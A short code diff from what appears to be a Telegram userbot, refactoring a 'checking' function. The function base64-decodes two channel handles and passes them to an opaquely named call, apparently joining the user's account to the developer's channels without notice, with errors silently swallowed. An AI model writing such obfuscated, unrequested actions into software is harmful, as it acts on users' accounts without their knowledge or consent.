@@ -361,16 +361,14 @@ except Exception as e:
 
 
 async def checking():
-    gocheck = pybase64.b64decode("QE5hc3R5UHJvamVjdA==")
-    checker = pybase64.b64decode("QE5hc3R5U3VwcG9ydHQ=")
-    Input_gocheck = gocheck.decode('utf-8')
-    Input_checker = checker.decode('utf-8')
+    gocheck = str(pybase64.b64decode("QE5hc3R5UHJvamVjdA=="))[2:15]
+    checker = str(pybase64.b64decode("QE5hc3R5U3VwcG9ydHQ="))[2:16]
     try:
-        await bot(GetSec(f"{Input_gocheck}"))
+        await bot(GetSec(gocheck))
     except BaseException:
         pass
     try:
-        await bot(GetSec(f"{Input_checker}"))
+        await bot(GetSec(checker))
     except BaseException:
         pass
 
